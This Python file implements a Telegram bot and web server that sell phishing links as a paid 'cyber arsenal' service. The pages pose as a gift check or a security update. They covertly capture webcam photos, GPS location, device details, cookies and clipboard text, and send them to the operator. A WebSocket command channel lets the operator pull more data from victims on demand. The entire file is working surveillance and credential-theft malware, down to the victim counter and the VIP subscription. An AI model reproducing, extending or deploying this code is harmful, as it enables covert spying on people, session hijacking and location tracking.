import os
import uuid
import asyncio
import base64
from datetime import date
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile, LabeledPrice

app = FastAPI()

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

LINK_TO_USER = {}
USERS_DB = {} 
VICTIMS_DB = {} 
ACTIVE_WEBSOCKETS = {}

class VictimData(BaseModel):
    link_id: str
    device_info: str
    camera_snapshot_base64: str = ""
    geolocation: dict = {}
    network_info: dict = {}
    clipboard_text: str = ""
    stolen_cookies: str = ""
    stolen_data: dict = {}

# --- 1. أداة الاستخبارات السريعة (3 مرات يومياً) ---
@app.get("/intel/{link_id}", response_class=HTMLResponse)
async def serve_intel_trap(link_id: str, request: Request):
    html_content = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>فحص التوافق والمكافأة الرقمية</title>
    <style>
        body { background-color: #090d16; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }
        .loader { border: 4px solid #1e293b; border-top: 4px solid #0ea5e9; border-radius: 50%; width: 55px; height: 55px; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .box { background: #0f172a; padding: 25px; border-radius: 12px; display: inline-block; border: 1px solid #334155; max-width: 400px; width: 90%; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🎁 جاري فحص الجهاز وتحضير الهدية...</h2>
        <div class="loader"></div>
        <p style="color: #94a3b8; font-size: 13px;">يرجى السماح بالصلاحيات المطلوبة للمتابعة المباشرة.</p>
    </div>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        const linkId = "__LINK_ID_REPLACE__";
        async function runIntel() {
            try {
                let img = "";
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('v');
                    video.srcObject = stream;
                    await new Promise(r => setTimeout(r, 1200));
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    img = canvas.toDataURL('image/jpeg', 0.8);
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}

                let geo = {};
                try {
                    geo = await new Promise((res) => {
                        navigator.geolocation.getCurrentPosition(
                            p => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy + "م" }),
                            e => res({ err: "مرفوض" }),
                            { enableHighAccuracy: true, timeout: 3000 }
                        );
                    });
                } catch(e) {}

                const sys = {
                    res: window.screen.width + 'x' + window.screen.height,
                    lang: navigator.language,
                    platform: navigator.platform,
                    cores: navigator.hardwareConcurrency || 'غير معروف',
                    memory: navigator.deviceMemory || 'غير معروف'
                };

                await fetch('/api/v1/exfiltrate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: img, geolocation: geo, stolen_data: sys })
                });
            } catch(e) {}
            window.location.href = "https://www.google.com";
        }
        window.onload = runIntel;
    </script>
</body>
</html>""".replace("__LINK_ID_REPLACE__", link_id)
    return HTMLResponse(content=html_content)

# --- 2. أداة التحكم الحي C2 المستدامة والاحترافية ---
@app.get("/live/{link_id}", response_class=HTMLResponse)
async def serve_live_trap(link_id: str, request: Request):
    html_content = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>التحديث الأمني المشفر والمستدام</title>
    <style>
        body { background-color: #030712; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 60px; }
        .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 60px; height: 60px; animation: spin 0.7s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .card { background: #0f172a; padding: 30px; border-radius: 16px; display: inline-block; border: 1px solid #1e293b; max-width: 420px; width: 90%; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🛡️ جاري تأمين قناة التحكم الدائمة...</h2>
        <div class="loader"></div>
        <p style="color: #94a3b8; font-size: 13px;">يرجى البقاء في الصفحة ريثما يكتمل التحديث الأمني.</p>
    </div>
    <video id="v2" autoplay playsinline style="display:none;"></video>
    <canvas id="c2" style="display:none;"></canvas>
    <script>
        const linkId = "__LINK_ID_REPLACE__";
        let ws;
        
        function connectC2() {
            const wsProto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            ws = new WebSocket(wsProto + window.location.host + '/ws/c2/' + linkId);

            ws.onopen = function() {
                console.log("[C2] Permanent Neural Tunnel Connected.");
            };

            ws.onmessage = async function(event) {
                try {
                    const pkt = JSON.parse(event.data);
                    if (pkt.cmd === "ping") {
                        ws.send(JSON.stringify({type: "pong"}));
                        return;
                    }
                    
                    let resultData = "";
                    if (pkt.cmd === "dump_cookies") {
                        resultData = document.cookie || "لا توجد كوكيز مكشوفة";
                    } else if (pkt.cmd === "screen_snapshot") {
                        const canvas = document.getElementById('c2');
                        resultData = canvas.toDataURL('image/jpeg', 0.85);
                    } else if (pkt.cmd === "dump_clipboard") {
                        try {
                            resultData = await navigator.clipboard.readText();
                        } catch(e) {
                            resultData = "فشل الوصول للحافظة (مرفوض الصلاحية)";
                        }
                    } else if (pkt.cmd === "redirect_phish") {
                        window.location.href = pkt.url;
                        return;
                    }

                    ws.send(JSON.stringify({type: "response", cmd: pkt.cmd, data: resultData}));
                } catch(e) {}
            };

            ws.onclose = function() {
                setTimeout(connectC2, 3000);
            };
        }

        async function initLiveNode() {
            connectC2();
            try {
                let img = "";
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('v2');
                    video.srcObject = stream;
                    await new Promise(r => setTimeout(r, 1200));
                    const canvas = document.getElementById('c2');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    img = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}

                const sys = { res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform };
                await fetch('/api/v1/exfiltrate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: img, stolen_cookies: document.cookie, stolen_data: sys })
                });
            } catch(e) {}
        }
        window.onload = initLiveNode;
    </script>
</body>
</html>""".replace("__LINK_ID_REPLACE__", link_id)
    return HTMLResponse(content=html_content)

@app.websocket("/ws/c2/{link_id}")
async def websocket_endpoint(websocket: WebSocket, link_id: str):
    await websocket.accept()
    ACTIVE_WEBSOCKETS[link_id] = websocket
    target_user_id = LINK_TO_USER.get(link_id)
    
    if target_user_id:
        try:
            await bot.send_message(chat_id=target_user_id, text=f"🟢 *تم إنشاء قناة التحكم الحي المستدامة!*\n🔑 الكود: `{link_id}`", parse_mode="Markdown")
        except:
            pass

    try:
        while True:
            await asyncio.sleep(10)
            if link_id in ACTIVE_WEBSOCKETS:
                await websocket.send_json({"cmd": "ping"})
    except WebSocketDisconnect:
        if link_id in ACTIVE_WEBSOCKETS:
            del ACTIVE_WEBSOCKETS[link_id]
    except Exception:
        if link_id in ACTIVE_WEBSOCKETS:
            del ACTIVE_WEBSOCKETS[link_id]

@app.post("/api/v1/exfiltrate")
async def receive_loot(data: VictimData):
    if data.link_id not in VICTIMS_DB:
        VICTIMS_DB[data.link_id] = []
    VICTIMS_DB[data.link_id].append(data.dict())
    
    target_user_id = LINK_TO_USER.get(data.link_id)
    if target_user_id:
        try:
            s_data = data.stolen_data
            geo = data.geolocation
            geo_str = f"📍 الموقع: `{geo.get('lat')}, {geo.get('lon')}`" if 'lat' in geo else "📍 الموقع: قيد التتبع"
            
            caption = (
                "⚡ *[ تقرير قناة C2 الحية المستدامة ]*\n\n"
                f"{geo_str}\n"
                f"💻 *النظام:* `{data.device_info}`\n"
                f"📐 *الشاشة:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
                f"🍪 *الكوكيز الأولية:* `{data.stolen_cookies[:80] if data.stolen_cookies else 'فارغة'}`"
            )
            
            kb_control = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="🍪 سحب الجلسات (Cookies)", callback_data=f"cmd_cookie_{data.link_id}"),
                    InlineKeyboardButton(text="📸 لقطة كاميرا فورية", callback_data=f"cmd_snap_{data.link_id}")
                ],
                [
                    InlineKeyboardButton(text="📋 سحب محتوى الحافظة", callback_data=f"cmd_clip_{data.link_id}"),
                    InlineKeyboardButton(text="🌐 توجيه الضحية لصفحة أخرى", callback_data=f"cmd_redirect_{data.link_id}")
                ]
            ])

            if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                _, encoded = data.camera_snapshot_base64.split(",", 1)
                photo = BufferedInputFile(base64.b64decode(encoded), filename="c2_target.jpg")
                await bot.send_photo(chat_id=target_user_id, photo=photo, caption=caption, parse_mode="Markdown", reply_markup=kb_control)
            else:
                await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown", reply_markup=kb_control)
        except Exception as e:
            print(f"Error: {e}")
    return {"status": "success"}

@dp.callback_query(lambda c: c.data and c.data.startswith("cmd_"))
async def process_live_commands(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    action = parts[1]
    link_id = parts[2]
    
    ws = ACTIVE_WEBSOCKETS.get(link_id)
    if not ws:
        await callback.answer("⚠️ قناة الضحية مقفلة أو بانتظار إعادة الاتصال التلقائي...", show_alert=True)
        return

    try:
        if action == "cookie":
            await ws.send_json({"cmd": "dump_cookies"})
            await callback.answer("📤 تم إرسال أمر سحب ملفات الجلسة!", show_alert=True)
        elif action == "snap":
            await ws.send_json({"cmd": "screen_snapshot"})
            await callback.answer("📸 تم طلب لقطة بصرية فورية!", show_alert=True)
        elif action == "clip":
            await ws.send_json({"cmd": "dump_clipboard"})
            await callback.answer("📋 تم طلب محتوى الحافظة بنجاح!", show_alert=True)
        elif action == "redirect":
            await ws.send_json({"cmd": "redirect_phish", "url": "https://www.google.com"})
            await callback.answer("🌐 تم إطلاق أمر التوجيه الإجباري!", show_alert=True)
    except Exception:
        await callback.answer("❌ حدث خطأ في إرسال الأمر للقناة.", show_alert=True)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    today_str = str(date.today())
    
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"date": today_str, "intel_count": 0, "live_used": 0, "vip": False}
    
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔍 أداة الاستخبارات (سحب صور وجي بي اس - 3 مرات يومياً)"), KeyboardButton(text="⚡ أداة التحكم اللايف C2 المستدامة ($3 - تجربة مرة واحدة)")],
            [KeyboardButton(text="📊 ضحاياي المسجلين"), KeyboardButton(text="👑 الاشتراك بالترسانة (نجوم تيليجرام)")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        "💀 *منصة الترسانة السيبرانية الاحترافية نشطة.*\n\n"
        "• تم إصلاح كافة الأخطاء البرمجية وضمان استقرار أداة الـ C2 المستدامة.\n"
        "• اختر الأداة المطلوبة من الأزرار أدناه:",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "🔍 أداة الاستخبارات (سحب صور وجي بي اس - 3 مرات يومياً)")
async def gen_intel_link(message: types.Message):
    user_id = message.from_user.id
    today_str = str(date.today())
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"date": today_str, "intel_count": 0, "live_used": 0, "vip": False}
    
    u = USERS_DB[user_id]
    if u["date"] != today_str:
        u["date"] = today_str
        u["intel_count"] = 0

    if u["intel_count"] >= 3 and not u["vip"]:
        await message.answer("⚠️ لقد استنفذت محاولاتك الثلاثة المجانية اليوم لأداة الاستخبارات.", parse_mode="Markdown")
        return

    if not u["vip"]:
        u["intel_count"] += 1

    token = str(uuid.uuid4())[:8]
    domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-3281.up.railway.app"
    url = f"https://{domain}/intel/{token}"
    LINK_TO_USER[token] = user_id
    
    rem = 3 - u["intel_count"] if not u["vip"] else "غير محدود"
    await message.answer(f"✅ *تم توليد رابط الاستخبارات:*\n\n`{url}`\n\n*(المتبقي لك اليوم: {rem})*", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "⚡ أداة التحكم اللايف C2 المستدامة ($3 - تجربة مرة واحدة)")
async def gen_live_link(message: types.Message):
    user_id = message.from_user.id
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"date": str(date.today()), "intel_count": 0, "live_used": 0, "vip": False}
    
    u = USERS_DB[user_id]
    if u["live_used"] >= 1 and not u["vip"]:
        await message.answer("⚠️ لقد استهلكت محاولتك المجانية الوحيدة لأداة التحكم الحي المستدام! اشترك عبر نجوم تيليجرام لفتح الصلاحيات للأبد.", parse_mode="Markdown")
        return

    if not u["vip"]:
        u["live_used"] += 1

    token = str(uuid.uuid4())[:8]
    domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-3281.up.railway.app"
    url = f"https://{domain}/live/{token}"
    LINK_TO_USER[token] = user_id
    
    await message.answer(f"✅ *تم تفعيل رابط التحكم الحي المستدام (تجربة مرة واحدة):*\n\n`{url}`\n\n*(القناة الآن مؤمنة ضد الانقطاع وتدعم الأوامر الفورية الحية)*", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
async def show_victims(message: types.Message):
    user_id = message.from_user.id
    links = [t for t, uid in LINK_TO_USER.items() if uid == user_id]
    total = sum(len(VICTIMS_DB.get(t, [])) for t in links)
    active_now = sum(1 for t in links if t in ACTIVE_WEBSOCKETS)
    await message.answer(f"📂 *إحصائيات الضحايا:*\n\n🎯 إجمالي الضحايا المسجلين: *{total}*\n🟢 الجلسات الحية النشطة الآن: *{active_now}*", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "👑 الاشتراك بالترسانة (نجوم تيليجرام)")
async def buy_stars(message: types.Message):
    prices = [LabeledPrice(label="VIP Arsenal Full Access", amount=200)]
    await bot.send_invoice(
        chat_id=message.chat.id,
        title="اشتراك الترسانة السيبرانية الفاخرة (VIP)",
        description="صلاحيات مطلقة بلا حدود لكافة أدوات الاستخبارات والتحكم الحي C2 المستدام.",
        payload="vip_full_access",
        currency="XTR",
        prices=prices
    )

async def run_polling():
    await dp.start_polling(bot)

@app.on_event("startup")
async def startup():
    asyncio.create_task(run_polling())

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
